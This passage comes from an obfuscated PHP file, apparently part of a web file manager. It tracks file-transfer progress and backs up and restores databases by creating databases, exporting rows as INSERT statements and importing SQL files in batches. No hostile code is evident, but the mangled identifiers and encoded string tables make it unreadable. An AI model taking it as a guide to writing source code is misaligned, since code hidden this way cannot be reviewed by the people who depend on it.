$ÅíÃÇ¬¤[1077]))->delete(); } $¬¤Àêœ§ = json_encode($ù·ëÎÉ); if (!$¬¤Àêœ§) { ob_start(); var_dump($ù·ëÎÉ); $™Á›Ô÷¸ = ob_get_clean(); self::log($ÅíÃÇ¬¤[1688] . json_encode_force($™Á›Ô÷¸)); } if (!$Ï«„Ì¤Ÿ || !$ù·ëÎÉ[$ÅíÃÇ¬¤[407]]) { return !1; } $¹ùÁÜ¬û = array($ÅíÃÇ¬¤[33] => $ÅíÃÇ¬¤[1077], $ÅíÃÇ¬¤[1663] => USER_ID, $ÅíÃÇ¬¤[94] => $Ï«„Ì¤Ÿ, $ÅíÃÇ¬¤[383] => $¬¤Àêœ§); $—ŠÒºÖ¾ = $ÅíÃÇ¬¤[1689]; CacheLock::lock($—ŠÒºÖ¾); Model($ÅíÃÇ¬¤[455])->add($¹ùÁÜ¬û, array(), !0); CacheLock::unlock($—ŠÒºÖ¾); } public static function log($£­‰÷¢á) { if (!GLOBAL_DEBUG) { return; } write_log($£­‰÷¢á, $_SERVER[ Ö‘ñÄ”][1690]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ëÊ¼àĞÆ =& $_SERVER[ Ö‘ñÄ”]; $·ØÙÅ›í =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ëÊ¼àĞÆ[1691], array($this, $ëÊ¼àĞÆ[1692])); Hook::bind($ëÊ¼àĞÆ[1221], array($this, $ëÊ¼àĞÆ[1693])); Hook::bind($ëÊ¼àĞÆ[1694], array($this, $ëÊ¼àĞÆ[1695])); Hook::bind($ëÊ¼àĞÆ[612], array($this, $ëÊ¼àĞÆ[1696])); Hook::bind($ëÊ¼àĞÆ[613], array($this, $ëÊ¼àĞÆ[1697])); Hook::bind($ëÊ¼àĞÆ[618], array($this, $ëÊ¼àĞÆ[1698])); Hook::bind($ëÊ¼àĞÆ[619], array($this, $ëÊ¼àĞÆ[1699])); Hook::bind($ëÊ¼àĞÆ[615], array($this, $ëÊ¼àĞÆ[1700])); Hook::bind($ëÊ¼àĞÆ[616], array($this, $ëÊ¼àĞÆ[1701])); Hook::bind($ëÊ¼àĞÆ[582], array($this, $ëÊ¼àĞÆ[1702])); Hook::bind($ëÊ¼àĞÆ[579], array($this, $ëÊ¼àĞÆ[1702])); Hook::bind($ëÊ¼àĞÆ[584], array($this, $ëÊ¼àĞÆ[1702])); Hook::bind($ëÊ¼àĞÆ[586], array($this, $ëÊ¼àĞÆ[1702])); Hook::bind($ëÊ¼àĞÆ[588], array($this, $ëÊ¼àĞÆ[1702])); Hook::bind($ëÊ¼àĞÆ[1703], array($this, $ëÊ¼àĞÆ[1704])); Hook::bind($ëÊ¼àĞÆ[605], array($this, $ëÊ¼àĞÆ[1705])); $this->sourceModelCopyFlag = !1; Hook::bind($ëÊ¼àĞÆ[1706], array($this, $ëÊ¼àĞÆ[1707])); Hook::bind($ëÊ¼àĞÆ[1708], array($this, $ëÊ¼àĞÆ[1709])); Hook::bind($ëÊ¼àĞÆ[1710], array($this, $ëÊ¼àĞÆ[1711])); $·ØÙÅ›í[$ëÊ¼àĞÆ[1712]] = LNG($ëÊ¼àĞÆ[1713]); $·ØÙÅ›í[$ëÊ¼àĞÆ[1714]] = 0; $·ØÙÅ›í[$ëÊ¼àĞÆ[1715]] = 0; $·ØÙÅ›í[$ëÊ¼àĞÆ[1070]] = $ëÊ¼àĞÆ[12]; $·ØÙÅ›í[$ëÊ¼àĞÆ[1716]] = $ëÊ¼àĞÆ[12]; $·ØÙÅ›í[$ëÊ¼àĞÆ[1717]] = 0; $·ØÙÅ›í[$ëÊ¼àĞÆ[1718]] = 0; $·ØÙÅ›í[$ëÊ¼àĞÆ[1719]] = 0; if (!$·ØÙÅ›í[$ëÊ¼àĞÆ[1562]]) { $·ØÙÅ›í[$ëÊ¼àĞÆ[1562]] = LNG($ëÊ¼àĞÆ[1720]); } } protected function endAfter() { $ÜÁ¼ŒÊá =& $_SERVER[ Ö‘ñÄ”]; Hook::unbind($ÜÁ¼ŒÊá[1691], array($this, $ÜÁ¼ŒÊá[1692])); Hook::unbind($ÜÁ¼ŒÊá[1221], array($this, $ÜÁ¼ŒÊá[1693])); Hook::unbind($ÜÁ¼ŒÊá[1694], array($this, $ÜÁ¼ŒÊá[1695])); Hook::unbind($ÜÁ¼ŒÊá[612], array($this, $ÜÁ¼ŒÊá[1696])); Hook::unbind($ÜÁ¼ŒÊá[613], array($this, $ÜÁ¼ŒÊá[1697])); Hook::unbind($ÜÁ¼ŒÊá[618], array($this, $ÜÁ¼ŒÊá[1698])); Hook::unbind($ÜÁ¼ŒÊá[619], array($this, $ÜÁ¼ŒÊá[1699])); Hook::unbind($ÜÁ¼ŒÊá[615], array($this, $ÜÁ¼ŒÊá[1700])); Hook::unbind($ÜÁ¼ŒÊá[616], array($this, $ÜÁ¼ŒÊá[1701])); Hook::unbind($ÜÁ¼ŒÊá[582], array($this, $ÜÁ¼ŒÊá[1702])); Hook::unbind($ÜÁ¼ŒÊá[579], array($this, $ÜÁ¼ŒÊá[1702])); Hook::unbind($ÜÁ¼ŒÊá[584], array($this, $ÜÁ¼ŒÊá[1702])); Hook::unbind($ÜÁ¼ŒÊá[586], array($this, $ÜÁ¼ŒÊá[1702])); Hook::unbind($ÜÁ¼ŒÊá[588], array($this, $ÜÁ¼ŒÊá[1702])); Hook::unbind($ÜÁ¼ŒÊá[1703], array($this, $ÜÁ¼ŒÊá[1704])); Hook::unbind($ÜÁ¼ŒÊá[605], array($this, $ÜÁ¼ŒÊá[1705])); Hook::unbind($ÜÁ¼ŒÊá[1706], array($this, $ÜÁ¼ŒÊá[1707])); Hook::unbind($ÜÁ¼ŒÊá[1708], array($this, $ÜÁ¼ŒÊá[1709])); Hook::unbind($ÜÁ¼ŒÊá[1710], array($this, $ÜÁ¼ŒÊá[1711])); } public function copyMoveStart($Ä°áîƒï, $ºÛ„¼œ, $Ÿ¬ûÔŒÊ, $­á¦€öõ) { $°ÅŞ”ª§ =& $_SERVER[ Ö‘ñÄ”]; self::log($°ÅŞ”ª§[1721] . $ºÛ„¼œ . $°ÅŞ”ª§[70] . $­á¦€öõ); $è¡ÙÎ…Ô = rtrim(TEMP_FILES, $°ÅŞ”ª§[8]); if (substr($ºÛ„¼œ, 0, strlen($è¡ÙÎ…Ô)) == $è¡ÙÎ…Ô) { return; } if (substr($­á¦€öõ, 0, strlen($è¡ÙÎ…Ô)) == $è¡ÙÎ…Ô) { return; } $àÚûé¸Å =& $this->task; $àÚûé¸Å[$°ÅŞ”ª§[1722]] = KodIO::transferType($Ä°áîƒï, $Ÿ¬ûÔŒÊ); $this->update(); } public function updateAfter() { $à‚´í¤ =& $_SERVER[ Ö‘ñÄ”]; $í¶Æú‡í =& $this->task; if (!$í¶Æú‡í[$à‚´í¤[776]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($í¶Æú‡í[$à‚´í¤[1722]] == $à‚´í¤[1310]) { return; } self::updateTask($í¶Æú‡í); } private static function updateTask(&$Íƒ×ã•Ü) { $ıì´¬ùÔ =& $_SERVER[ Ö‘ñÄ”]; if ($Íƒ×ã•Ü[$ıì´¬ùÔ[1722]] == $ıì´¬ùÔ[1205] || $Íƒ×ã•Ü[$ıì´¬ùÔ[1722]] == $ıì´¬ùÔ[107]) { if ($Íƒ×ã•Ü[$ıì´¬ùÔ[1716]]) { $Íƒ×ã•Ü[$ıì´¬ùÔ[1719]] = $Íƒ×ã•Ü[$ıì´¬ùÔ[1718]] + $Íƒ×ã•Ü[$ıì´¬ùÔ[1715]]; } } else { if ($Íƒ×ã•Ü[$ıì´¬ùÔ[1722]] == $ıì´¬ùÔ[1311]) { if ($Íƒ×ã•Ü[$ıì´¬ùÔ[1716]] == $ıì´¬ùÔ[1205]) { $Íƒ×ã•Ü[$ıì´¬ùÔ[1719]] = $Íƒ×ã•Ü[$ıì´¬ùÔ[1718]] + $Íƒ×ã•Ü[$ıì´¬ùÔ[1715]] * 0.5; } else { if ($Íƒ×ã•Ü[$ıì´¬ùÔ[1716]] == $ıì´¬ùÔ[107]) { $Íƒ×ã•Ü[$ıì´¬ùÔ[1719]] = $Íƒ×ã•Ü[$ıì´¬ùÔ[1718]] + $Íƒ×ã•Ü[$ıì´¬ùÔ[1714]] * 0.5 + $Íƒ×ã•Ü[$ıì´¬ùÔ[1715]] * 0.5; } } } } $Íƒ×ã•Ü[$ıì´¬ùÔ[1665]] = $Íƒ×ã•Ü[$ıì´¬ùÔ[1719]] / $Íƒ×ã•Ü[$ıì´¬ùÔ[776]]; if ($Íƒ×ã•Ü[$ıì´¬ùÔ[1665]] > 0) { $©Ü«‚—å = timeFloat() - $Íƒ×ã•Ü[$ıì´¬ùÔ[1667]] - $Íƒ×ã•Ü[$ıì´¬ùÔ[1670]]; $Íƒ×ã•Ü[$ıì´¬ùÔ[1671]] = $©Ü«‚—å * (1 - $Íƒ×ã•Ü[$ıì´¬ùÔ[1665]]) / $Íƒ×ã•Ü[$ıì´¬ùÔ[1665]]; } } public function addPath($…„ı™ü¢) { $€¯ê¹€ =& $_SERVER[ Ö‘ñÄ”]; if (!$…„ı™ü¢) { return; } $â ¬òõ =& $this->task; $Û‹Ú‰¨ = IO::infoWithChildren($…„ı™ü¢); $ßâÅ—áé = $â ¬òõ[$€¯ê¹€[1723]] ? $â ¬òõ[$€¯ê¹€[1723]][$€¯ê¹€[1724]] : 0; $â ¬òõ[$€¯ê¹€[1723]] = array($€¯ê¹€[1724] => $ßâÅ—áé + 1, $€¯ê¹€[428] => $Û‹Ú‰¨[$€¯ê¹€[32]], $€¯ê¹€[84] => $Û‹Ú‰¨[$€¯ê¹€[84]], $€¯ê¹€[527] => $Û‹Ú‰¨[$€¯ê¹€[527]] ? $Û‹Ú‰¨[$€¯ê¹€[527]] : $Û‹Ú‰¨[$€¯ê¹€[84]]); if ($Û‹Ú‰¨[$€¯ê¹€[33]] == $€¯ê¹€[199]) { $â ¬òõ[$€¯ê¹€[799]] += 1; } else { $â ¬òõ[$€¯ê¹€[799]] += $Û‹Ú‰¨[$€¯ê¹€[79]][$€¯ê¹€[77]]; if ($Û‹Ú‰¨[$€¯ê¹€[410]]) { $â ¬òõ[$€¯ê¹€[799]] += $Û‹Ú‰¨[$€¯ê¹€[79]][$€¯ê¹€[78]] + 1; } } $â ¬òõ[$€¯ê¹€[776]] += $Û‹Ú‰¨[$€¯ê¹€[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($áĞÎ«ÆÊ) { } public function sourceAddHashEnd($¼İ¶áË) { } public function sourceAddFileStart($¾åìÒƒÆ) { $‰é”Ë¼Å =& $_SERVER[ Ö‘ñÄ”]; $Ï•Óéñ¶ =& $this->task; $Ï•Óéñ¶[$‰é”Ë¼Å[1714]] = $¾åìÒƒÆ[$‰é”Ë¼Å[76]]; $Ï•Óéñ¶[$‰é”Ë¼Å[1712]] = $¾åìÒƒÆ[$‰é”Ë¼Å[32]]; $Ï•Óéñ¶[$‰é”Ë¼Å[1070]] = $¾åìÒƒÆ[$‰é”Ë¼Å[32]]; $Ï•Óéñ¶[$‰é”Ë¼Å[1725]] = $¾åìÒƒÆ[$‰é”Ë¼Å[84]]; $this->update(); } public function sourceAddFileEnd($Êˆã–Ó”) { $Šğ§´õ =& $_SERVER[ Ö‘ñÄ”]; $¥‰ûùÏñ =& $this->task; $¥‰ûùÏñ[$Šğ§´õ[1719]] += $Êˆã–Ó”[$Šğ§´õ[76]]; $¥‰ûùÏñ[$Šğ§´õ[1725]] = $Êˆã–Ó”[$Šğ§´õ[84]]; $this->update(1); } public function copyFileStart($¿±â«Ú‡, $…¾®Åà, $òÀÂ‚‘, $‹†õáÈ¡, $ÆÛÀîŠ¬, $Æ¸Ê¸ì) { $Êòô”˜¦ =& $_SERVER[ Ö‘ñÄ”]; $³ÎŸ“É‡ = $ÆÛÀîŠ¬; if ($³ÎŸ“É‡ == $GLOBALS[$Êòô”˜¦[1726]]) { $³ÎŸ“É‡ = $GLOBALS[$Êòô”˜¦[1727]]; } $GLOBALS[$Êòô”˜¦[1727]] = $ÆÛÀîŠ¬; $GLOBALS[$Êòô”˜¦[1726]] = $Æ¸Ê¸ì; $·ª‹ÕÈæ =& $this->task; $·ª‹ÕÈæ[$Êòô”˜¦[1712]] = $³ÎŸ“É‡; $·ª‹ÕÈæ[$Êòô”˜¦[1714]] = (int) $¿±â«Ú‡->size($…¾®Åà); $·ª‹ÕÈæ[$Êòô”˜¦[1715]] = 0; $·ª‹ÕÈæ[$Êòô”˜¦[1070]] = $Êòô”˜¦[12]; $·ª‹ÕÈæ[$Êòô”˜¦[1716]] = $Êòô”˜¦[12]; $·ª‹ÕÈæ[$Êòô”˜¦[1717]] = 0; $§×ÜÍëŠ = $·ª‹ÕÈæ[$Êòô”˜¦[1714]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($·ª‹ÕÈæ[$Êòô”˜¦[407]] . $Êòô”˜¦[1728]); if ($§×ÜÍëŠ && file_exists(get_path_father($‹†õáÈ¡))) { Cache::set($·ª‹ÕÈæ[$Êòô”˜¦[407]] . $Êòô”˜¦[1728], $‹†õáÈ¡); $·ª‹ÕÈæ[$Êòô”˜¦[1685]] = array($Êòô”˜¦[1729], $Êòô”˜¦[1730]); } $this->update(0, $§×ÜÍëŠ); } public static function updateCopyLocalFileSize($âœĞ†ò¨) { $£®Ú²»­ =& $_SERVER[ Ö‘ñÄ”]; $Ãø¿ªé = Cache::get($âœĞ†ò¨[$£®Ú²»­[407]] . $£®Ú²»­[1728]); if (!$Ãø¿ªé || !file_exists($Ãø¿ªé)) { return $âœĞ†ò¨; } $âœĞ†ò¨[$£®Ú²»­[1715]] = @filesize($Ãø¿ªé); $âœĞ†ò¨[$£®Ú²»­[1719]] += $âœĞ†ò¨[$£®Ú²»­[1715]]; self::updateTask($âœĞ†ò¨); return $âœĞ†ò¨; } public function copyFileEnd($–äª²•, $Èß°‘®æ, $ñÅì«À, $¾öÚ¸ƒ›, $ê¶õË½å, $‡ğ’£çğ) { $ˆÃºşø’ =& $_SERVER[ Ö‘ñÄ”]; $ä°™Şœ« =& $this->task; $ä°™Şœ«[$ˆÃºşø’[1715]] = $ä°™Şœ«[$ˆÃºşø’[1714]]; $ä°™Şœ«[$ˆÃºşø’[1716]] = $ˆÃºşø’[12]; unset($ä°™Şœ«[$ˆÃºşø’[1685]]); if ($ê¶õË½å == $ä°™Şœ«[$ˆÃºşø’[1712]]) { $ä°™Şœ«[$ˆÃºşø’[1718]] += $ä°™Şœ«[$ˆÃºşø’[1714]]; $ä°™Şœ«[$ˆÃºşø’[1719]] = $ä°™Şœ«[$ˆÃºşø’[1718]]; $ş¸Ú«’ = 1; if (isset($ä°™Şœ«[$ˆÃºşø’[1725]]) && $ä°™Şœ«[$ˆÃºşø’[1725]] == $Èß°‘®æ) { $ş¸Ú«’ = 0; } $this->update($ş¸Ú«’); } else { $this->update(); $ä°™Şœ«[$ˆÃºşø’[1715]] = 0; } Cache::remove($ä°™Şœ«[$ˆÃºşø’[407]] . $ˆÃºşø’[1728]); self::log($ˆÃºşø’[1731] . $Èß°‘®æ . $ˆÃºşø’[70] . $¾öÚ¸ƒ› . $ˆÃºşø’[231] . $ê¶õË½å . $ˆÃºşø’[1732] . $ä°™Şœ«[$ˆÃºşø’[1712]]); } public function updateFileEnd($³ê‹÷ë‚, $ã©ö¡˜§) { $¾ÆÔ†¨ =& $_SERVER[ Ö‘ñÄ”]; $šº‘“¯ =& $this->task; $šº‘“¯[$¾ÆÔ†¨[1712]] = $³ê‹÷ë‚; $šº‘“¯[$¾ÆÔ†¨[1714]] = $ã©ö¡˜§; $šº‘“¯[$¾ÆÔ†¨[1718]] += $ã©ö¡˜§; $šº‘“¯[$¾ÆÔ†¨[1719]] = $šº‘“¯[$¾ÆÔ†¨[1718]]; $this->update(1); self::log($¾ÆÔ†¨[1733] . $³ê‹÷ë‚); } public function sourceModelCopy($»§ŠÓÀ«) { $˜ÕïÅì¸ =& $_SERVER[ Ö‘ñÄ”]; $øÇÓªªÀ = $»§ŠÓÀ«[0]; $İÌÆÚÂ÷ = $»§ŠÓÀ«[1]; $÷Ûà¿§ =& $this->task; $this->sourceModelCopyFlag = !0; $ˆ©ƒÓ¯› = 0; switch ($øÇÓªªÀ) { case $˜ÕïÅì¸[580]: $ˆ©ƒÓ¯› = 1; break; case $˜ÕïÅì¸[583]: $÷Ûà¿§[$˜ÕïÅì¸[1712]] = $İÌÆÚÂ÷[$˜ÕïÅì¸[32]]; break; case $˜ÕïÅì¸[585]: $ˆ©ƒÓ¯› = intval($»§ŠÓÀ«[$˜ÕïÅì¸[388]] * 0.4); break; case $˜ÕïÅì¸[587]: $ˆ©ƒÓ¯› = intval($»§ŠÓÀ«[$˜ÕïÅì¸[388]] * 0.2); break; case $˜ÕïÅì¸[589]: $ˆ©ƒÓ¯› = intval($»§ŠÓÀ«[$˜ÕïÅì¸[388]] * 0.4); break; } $this->update($ˆ©ƒÓ¯›); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ÊÏ½è­¦, $ïñŸñÄÖ) { $ÃÊÉûÓø =& $_SERVER[ Ö‘ñÄ”]; $this->sourceModelCopyFlag = !0; $àÁ°Úû = 1; if (isset($ÊÏ½è­¦[$ÃÊÉûÓø[79]])) { $àÁ°Úû = $ÊÏ½è­¦[$ÃÊÉûÓø[79]][$ÃÊÉûÓø[77]]; $àÁ°Úû = $àÁ°Úû + $ÊÏ½è­¦[$ÃÊÉûÓø[79]][$ÃÊÉûÓø[78]] + 1; } $this->update($àÁ°Úû); $this->sourceModelCopyFlag = !1; } public function sourceMove($øÄ£§©) { $this->sourceRemove($øÄ£§©, !1); } public function curlProgress($åì»™²‡, $”¹‹³ó, $›—¯Ú”à, $Á÷µÊæ, $âİâÁÎ) { $…àÁ×ˆÊ =& $_SERVER[ Ö‘ñÄ”]; $Ê“õ€è„ =& $this->task; if ($âİâÁÎ > 0) { $Ê“õ€è„[$…àÁ×ˆÊ[1070]] = $…àÁ×ˆÊ[1734]; $Ê“õ€è„[$…àÁ×ˆÊ[1716]] = $…àÁ×ˆÊ[107]; if ($Ê“õ€è„[$…àÁ×ˆÊ[1714]]) { $Ê“õ€è„[$…àÁ×ˆÊ[1715]] = $âİâÁÎ; } if ($Ê“õ€è„[$…àÁ×ˆÊ[1717]]) { $Ê“õ€è„[$…àÁ×ˆÊ[1715]] = $âİâÁÎ + $Ê“õ€è„[$…àÁ×ˆÊ[1717]]; } } else { if ($›—¯Ú”à > 0) { if ($Ê“õ€è„[$…àÁ×ˆÊ[1714]] == $”¹‹³ó) { $Ê“õ€è„[$…àÁ×ˆÊ[1715]] = $›—¯Ú”à; $Ê“õ€è„[$…àÁ×ˆÊ[1070]] = $…àÁ×ˆÊ[1735]; $Ê“õ€è„[$…àÁ×ˆÊ[1716]] = $…àÁ×ˆÊ[1205]; } } } $this->update(); } public function curlProgressStart($ºâ¶Àï™) { } public function curlProgressEnd($â™ü¿É°) { $¥ìÅÒïŞ =& $_SERVER[ Ö‘ñÄ”]; $¶ò§‘½Ç =& $this->task; $ĞƒŞñ½¬ = curl_getinfo($â™ü¿É°); $â±Û£ƒ¤ = $ĞƒŞñ½¬[$¥ìÅÒïŞ[1736]]; if ($â±Û£ƒ¤ == -1) { $â±Û£ƒ¤ = $ĞƒŞñ½¬[$¥ìÅÒïŞ[1737]]; } if ($¶ò§‘½Ç[$¥ìÅÒïŞ[1716]] == $¥ìÅÒïŞ[107] && $â±Û£ƒ¤) { $¶ò§‘½Ç[$¥ìÅÒïŞ[1717]] += $â±Û£ƒ¤; } $this->update(); } } goto b˜ÎëÎæ­î; F‹ƒöÒçĞĞ: class DbManage { function __construct($ä“¥ß£î = array()) { $ÚŒ…î„è =& $_SERVER[ Ö‘ñÄ”]; if (empty($ä“¥ß£î)) { $ä“¥ß£î = $GLOBALS[$ÚŒ…î„è[6]][$ÚŒ…î„è[21]]; } $this->database = $ä“¥ß£î; } public function model($¸Šãı†´ = '') { return new ModelBase($¸Šãı†´, $_SERVER[ Ö‘ñÄ”][12], $this->database); } public function db($ù”¢•×ü = false) { $™àäı» =& $_SERVER[ Ö‘ñÄ”]; $ÂÙ°²Ò = array_change_key_case($this->database); if ($this->dbType() == $™àäı»[13] || !$ù”¢•×ü) { return $this->model()->db(); } $şÆ›÷†™ = $ÂÙ°²Ò[$™àäı»[978]]; $ÂÙ°²Ò[$™àäı»[978]] = $™àäı»[12]; if ($ÂÙ°²Ò[$™àäı»[973]] == $™àäı»[970]) { $Íª†¶Ï = $ÂÙ°²Ò[$™àäı»[979]]; $ÂÙ°²Ò[$™àäı»[979]] = substr($Íª†¶Ï, 0, strrpos($Íª†¶Ï, $™àäı»[1065])); } $this->database = $ÂÙ°²Ò; $æ÷Ş¿ = $this->model()->db(); try { $´¥Ş—«† = $æ÷Ş¿->execute("\163\150\157\x77\x20\144\x61\x74\141\x62\x61\x73\145\x73\x20\x6c\151\153\x65\x20\47{$şÆ›÷†™}\x27"); } catch (Exception $”•ùı”û) { } if (!$´¥Ş—«†) { $æ÷Ş¿->execute("\143\x72\145\141\164\x65\40\144\141\164\x61\142\141\x73\145\x20\x60{$şÆ›÷†™}\140"); } $ÂÙ°²Ò[$™àäı»[978]] = $şÆ›÷†™; if ($ÂÙ°²Ò[$™àäı»[973]] == $™àäı»[970]) { $ÂÙ°²Ò[$™àäı»[979]] .= $™àäı»[1065] . $şÆ›÷†™; } $this->database = $ÂÙ°²Ò; $æ÷Ş¿->execute("\x75\163\x65\40\140{$şÆ›÷†™}\140"); return $æ÷Ş¿; } public function createTable($òó”Ğ‘, &$ş”î˜¯) { $éé¼æìˆ =& $_SERVER[ Ö‘ñÄ”]; if (!IO::exist($òó”Ğ‘)) { ActionCall($éé¼æìˆ[1066], !0, 0); show_json(LNG($éé¼æìˆ[1067]), !1); } $ª·ğ×·÷ = $this->model()->db(); $ğÃûòî¾ = sqlSplit(IO::getContent($òó”Ğ‘)); foreach ($ğÃûòî¾ as $‰¢ÍÂîİ) { $œâ×¹õ™ = stripos($‰¢ÍÂîİ, $éé¼æìˆ[1068]) === 0; if ($œâ×¹õ™) { $ş”î˜¯->task[$éé¼æìˆ[799]] += 1; } $ª·ğ×·÷->execute($‰¢ÍÂîİ); if ($œâ×¹õ™) { preg_match($éé¼æìˆ[1069], $‰¢ÍÂîİ, $­¸Öçè¸); $ş”î˜¯->task[$éé¼æìˆ[1070]] = $­¸Öçè¸[1]; $ş”î˜¯->update(1); } } } public function insertTable($‡ïğèÄ…, &$ÍÜ§š) { $öØ™Äö÷ =& $_SERVER[ Ö‘ñÄ”]; $€û²â « = $this->model()->db(); $°Ñ…Î§ = $ˆ‚âÉ ? array($ˆ‚âÉ) : $€û²â «->getTables(); foreach ($‡ïğèÄ… as $ÉÖ•éãğ) { $ˆ‚âÉ = basename($ÉÖ•éãğ, $öØ™Äö÷[801]); if (!in_array($ˆ‚âÉ, $°Ñ…Î§)) { continue; } $ÍÜ§š->task[$öØ™Äö÷[1070]] = $ˆ‚âÉ; if (get_filesize($ÉÖ•éãğ) == 0) { continue; } $ˆ½û«Âµ = $this->sqlToDb($ÉÖ•éãğ, $ÍÜ§š); if (!$ˆ½û«Âµ) { ActionCall($öØ™Äö÷[1066], !0, 0); show_json(LNG($öØ™Äö÷[1071]) . "\x5b{$ˆ‚âÉ}\135", !1); } } } public function sqlFromDb($Ç®ˆğ“, $º–åŒìÀ, &$ë•éêÔÓ, $µ¯Á“‰³ = '') { if ($ë•éêÔÓ) { $ë•éêÔÓ->task[$_SERVER[ Ö‘ñÄ”][1070]] = $Ç®ˆğ“; } $õÚÂ…ıš = $this->model($Ç®ˆğ“); $¯äœøÔ’ = 0; $‘”¤œ¡ = 0; $ª«‰÷îù = 10000; $Äµ™©Â = fopen($º–åŒìÀ, $_SERVER[ Ö‘ñÄ”][1072]); $ÃßÁˆı¿ = $õÚÂ…ıš->getPk(); $›Ùßòğ× = $õÚÂ…ıš->getDbFields(); $À—‘—İ¯ = $_SERVER[ Ö‘ñÄ”][12]; if ($GLOBALS[$_SERVER[ Ö‘ñÄ”][800]] && in_array($Ç®ˆğ“, array($_SERVER[ Ö‘ñÄ”][1073], $_SERVER[ Ö‘ñÄ”][1074]))) { $À—‘—İ¯ = $Ç®ˆğ“; } do { $•·úå¥¤ = array($ÃßÁˆı¿ => array($_SERVER[ Ö‘ñÄ”][1020], $‘”¤œ¡)); $ó´œ®Óğ = $õÚÂ…ıš->where($•·úå¥¤)->field($›Ùßòğ×)->order($ÃßÁˆı¿ . $_SERVER[ Ö‘ñÄ”][1075])->limit($ª«‰÷îù)->select(); $ó´œ®Óğ = !empty($ó´œ®Óğ) ? $ó´œ®Óğ : array(); if (!($ğÌÍè æ = count($ó´œ®Óğ))) { break; } $ïù£‘ó³ = end($ó´œ®Óğ); $‘”¤œ¡ = $ïù£‘ó³[$ÃßÁˆı¿]; $ĞÓ¥ÁœÎ = array(); foreach ($ó´œ®Óğ as $ÑÍÁ—å) { if ($À—‘—İ¯) { if ($Ç®ˆğ“ == $_SERVER[ Ö‘ñÄ”][1073]) { if ($ÑÍÁ—å[$_SERVER[ Ö‘ñÄ”][33]] == $_SERVER[ Ö‘ñÄ”][1076]) { $ˆıÚÁÀÌ = json_decode($ÑÍÁ—å[$_SERVER[ Ö‘ñÄ”][383]], !0); if ($ˆıÚÁÀÌ[$_SERVER[ Ö‘ñÄ”][32]] == $GLOBALS[$_SERVER[ Ö‘ñÄ”][800]] && $ˆıÚÁÀÌ[$_SERVER[ Ö‘ñÄ”][763]] != 1) { continue; } } } else { if ($ÑÍÁ—å[$_SERVER[ Ö‘ñÄ”][33]] == $_SERVER[ Ö‘ñÄ”][1077] && $ÑÍÁ—å[$_SERVER[ Ö‘ñÄ”][94]] == $_SERVER[ Ö‘ñÄ”][792]) { continue; } } } if ($µ¯Á“‰³) { $ÑÍÁ—å[$_SERVER[ Ö‘ñÄ”][84]] = "\x7b\x69\x6f\72{$µ¯Á“‰³}\175" . substr($ÑÍÁ—å[$_SERVER[ Ö‘ñÄ”][84]], strlen("\x7b\151\157\72{$ÑÍÁ—å[$_SERVER[ Ö‘ñÄ”][830]]}\175")); $ÑÍÁ—å[$_SERVER[ Ö‘ñÄ”][830]] = $µ¯Á“‰³; } $ĞÓ¥ÁœÎ[] = $_SERVER[ Ö‘ñÄ”][1078] . $this->sqlEncode($ÑÍÁ—å) . $_SERVER[ Ö‘ñÄ”][1079]; } $§°ûºÃƒ = "\111\116\123\x45\x52\x54\x20\x49\x4e\x54\x4f\x20\140{$Ç®ˆğ“}\140\x20\50\140" . implode($_SERVER[ Ö‘ñÄ”][1080], $›Ùßòğ×) . $_SERVER[ Ö‘ñÄ”][1081]; fwrite($Äµ™©Â, $§°ûºÃƒ . implode($_SERVER[ Ö‘ñÄ”][1082], $ĞÓ¥ÁœÎ) . $_SERVER[ Ö‘ñÄ”][71] . PHP_EOL); $¯äœøÔ’ += $ğÌÍè æ; if ($ë•éêÔÓ) { $ë•éêÔÓ->update($ğÌÍè æ); } } while ($ª«‰÷îù == $ğÌÍè æ); fclose($Äµ™©Â); return $¯äœøÔ’; } public function sqlToDb($üÜ·“§¤, &$Ä–®ºŠà) { $Û¤²¤·‚ =& $_SERVER[ Ö‘ñÄ”]; $»–Ôéû“ = $this->model()->db(); $¨ó¸ºÇü = @fopen($üÜ·“§¤, $Û¤²¤·‚[1083]); if (!$¨ó¸ºÇü) { return !1; } $Ãœº¥ş = 0; $•ïƒÙá = $Û¤²¤·‚[12]; $°ï¼Íãœ = array(); $Åä…­à£ = $this->dbType(); $ã¶ê‹œ = $Åä…­à£ == $Û¤²¤·‚[13] ? 500 : 2000; $”ˆÆ¤” = basename($üÜ·“§¤, $Û¤²¤·‚[801]); $­³¶¦‰ = 0; $£ëÎš±Î = 4194304 - 104858; $Ó¿Àä´ = 1000000 - 104858; while (!feof($¨ó¸ºÇü)) { $ÉãõûÚŠ = trim(fgets($¨ó¸ºÇü)); if (!$ÉãõûÚŠ) { continue; } $ô¡ä–ÀÜ = $this->sqlDecode($ÉãõûÚŠ, $Åä…­à£, $”ˆÆ¤”); if (stripos($ô¡ä–ÀÜ, $Û¤²¤·‚[364]) === 0) { if (!$•ïƒÙá) { $•ïƒÙá = $ô¡ä–ÀÜ . $Û¤²¤·‚[53]; } continue; } if ($Ä–®ºŠà) { $Ä–®ºŠà->task[$Û¤²¤·‚[799]] += 1; } $Ãœº¥ş++; $°ï¼Íãœ[] = rtrim(rtrim(trim($ô¡ä–ÀÜ), $Û¤²¤·‚[50]), $Û¤²¤·‚[71]); $¥ÑÚ—Àğ = null; $‹®¬úÕ¦ = strlen($ô¡ä–ÀÜ); $­³¶¦‰ += $‹®¬úÕ¦; if ($­³¶¦‰ >= ($ã¶ê‹œ == 500 ? $Ó¿Àä´ : $£ëÎš±Î)) { $¥ÑÚ—Àğ = array_pop($°ï¼Íãœ); if ($Ãœº¥ş > 1) { $Ãœº¥ş--; } } if ($Ãœº¥ş >= $ã¶ê‹œ || $¥ÑÚ—Àğ) { $ô¡ä–ÀÜ = $•ïƒÙá . implode($Û¤²¤·‚[50], $°ï¼Íãœ); if (!$»–Ôéû“->execute($ô¡ä–ÀÜ)) { return !1; } if ($Ä–®ºŠà) { $Ä–®ºŠà->update($Ãœº¥ş); } $°ï¼Íãœ = array(); $Ãœº¥ş = 0; $­³¶¦‰ = 0; if ($¥ÑÚ—Àğ) { $°ï¼Íãœ = array($¥ÑÚ—Àğ); $Ãœº¥ş = 1; $­³¶¦‰ = 